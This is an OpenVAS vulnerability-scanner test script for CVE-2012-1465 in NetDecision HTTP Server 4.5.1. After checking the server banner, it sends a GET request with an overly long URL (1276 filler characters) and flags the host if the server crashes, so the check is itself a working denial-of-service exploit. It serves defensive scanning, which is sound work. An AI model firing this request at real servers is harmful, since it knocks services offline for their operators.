###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netdecision_http_server_long_req_dos_vuln.nasl 11857 2018-10-12 08:25:16Z cfischer $
#
# NetDecision HTTP Server Long HTTP Request Remote Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802617");
  script_bugtraq_id(52208);
  script_version("$Revision: 11857 $");
  script_cve_id("CVE-2012-1465");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 10:25:16 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-03-08 15:19:34 +0530 (Thu, 08 Mar 2012)");
  script_name("NetDecision HTTP Server Long HTTP Request Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48168/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52208");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18541/");
  script_xref(name:"URL", value:"http://www.netmechanica.com/news/?news_id=26");
  script_xref(name:"URL", value:"http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_Vuln.txt");

  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("NetDecision-HTTP-Server/banner");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.");
  script_tag(name:"affected", value:"Netmechanica NetDecision 4.5.1");
  script_tag(name:"insight", value:"The flaw is due to a boundary error in the HTTP server when handling
  web requests can be exploited to cause a stack-based buffer overflow via an
  overly-long URL.");
  script_tag(name:"solution", value:"Upgrade to Netmechanica NetDecision 4.6.1 or later.");
  script_tag(name:"summary", value:"The host is running NetDecision HTTP Server and is prone to denial
  of service vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"http://www.netmechanica.com/products/?cat_id=2");
  exit(0);
}


include("http_func.inc");

port = get_http_port(default:80);

banner = get_http_banner(port: port);
if(!banner || "Server: NetDecision-HTTP-Server" >!< banner){
  exit(0);
}

req = http_get(item:string("/",crap(1276)), port:port);

## Send crafted request
res = http_send_recv(port:port, data:req);
sleep(3);

if(http_is_dead(port:port)){
  security_message(port:port);
  exit(0);
}

exit(99);
